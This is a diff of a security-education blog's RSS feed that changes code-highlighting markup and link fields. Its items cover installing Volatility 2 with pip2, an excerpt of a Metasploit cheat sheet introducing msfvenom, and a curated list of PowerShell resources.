-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install python-dev
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo python2 get-pip.py
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# upgrade setup tools to avoid &amp;#34;invalid command egg_info&amp;#34; error&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pip2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;upgrade&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;setuptools&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# install python-dev to avoid &amp;#34;x86_64-linux-gnu-gcc failed...&amp;#34; error&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install python-dev
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;now-that-pip2-is-installed-we-can-use-it-to-get-the-volatility-dependencies&#34;&gt;Now that pip2 is installed, we can use it to get the Volatility dependencies:&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install pycrypto
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install distorm3
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pip2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pycrypto&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pip2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;distorm3&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;!-- Google Ads --&gt;
 &lt;script async src=&#34;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js&#34;&gt;&lt;/script&gt;
 &lt;p&gt;&lt;ins class=&#34;adsbygoogle&#34;
@@ -556,18 +530,12 @@ data-ad-layout=&#34;in-article&#34;
 data-ad-format=&#34;fluid&#34;
 data-ad-client=&#34;ca-pub-3526678290068011&#34;
 data-ad-slot=&#34;7160066188&#34;&gt;&lt;/ins&gt;&lt;/p&gt;</description>
-      <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>http://localhost:1313/post/vol2-installation/</link>
-    
     </item>
-   
-      
-    
     <item>
       <title>Metasploit Cheat Sheet</title>
+      <link>https://classroom.anir0y.in/post/metasploit-cheat-sheet/</link>
       <pubDate>Sun, 21 Feb 2021 21:23:22 +0530</pubDate>
-      
-      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
+      <guid>https://classroom.anir0y.in/post/metasploit-cheat-sheet/</guid>
       <description>&lt;h4 id=&#34;metasploit-cheat-sheet&#34;&gt;Metasploit Cheat Sheet&lt;/h4&gt;
 &lt;p&gt;The Metasploit Project is a computer security project that provides information on vulnerabilities, helping in the development of penetration tests and IDS signatures.&lt;/p&gt;
 &lt;p&gt;Metasploit is a popular tool used by pentest experts. I have prepared a document for you to learn.&lt;/p&gt;
@@ -603,18 +571,12 @@ msf &amp;gt; run
 &lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;msfvenom-&#34;&gt;msfvenom :&lt;/h4&gt;
 &lt;p&gt;The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode
 them. This tool replaces the former msfpayload and msfencode tools. Run with ‘&amp;rsquo;-l payloads’ to get a list of payloads.&lt;/p&gt;</description>
-      <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>http://localhost:1313/post/metasploit-cheat-sheet/</link>
-    
     </item>
-   
-      
-    
     <item>
       <title>Awesome Powershell</title>
+      <link>https://classroom.anir0y.in/post/ref-powershell/</link>
       <pubDate>Thu, 18 Feb 2021 21:23:22 +0530</pubDate>
-      
-      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
+      <guid>https://classroom.anir0y.in/post/ref-powershell/</guid>
       <description>&lt;h1 id=&#34;awesome-powershell&#34;&gt;Awesome PowerShell&lt;/h1&gt;
 &lt;p&gt;A curated list of delightful &lt;a href=&#34;https://en.wikipedia.org/wiki/PowerShell&#34;&gt;PowerShell&lt;/a&gt; packages and resources.&lt;/p&gt;
 &lt;p&gt;PowerShell is a cross-platform (Windows, Linux, and macOS) automation and configuration tool that is optimized for dealing with structured data (e.g. JSON, CSV, XML, etc.), REST APIs, and object models.
@@ -901,12 +863,6 @@ Useful for security research, testing and quick hacks.&lt;/li&gt;
       var aax_src=&#39;302&#39;;
     &lt;/script&gt;
 &lt;script type=&#34;text/javascript&#34; language=&#34;javascript&#34; src=&#34;https://c.amazon-adsystem.com/aax2/assoc.js&#34;&gt;&lt;/script&gt;</description>
-      <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>http://localhost:1313/post/ref-powershell/</link>
-    
     </item>
-   
-      
-    
   </channel>
 </rss>
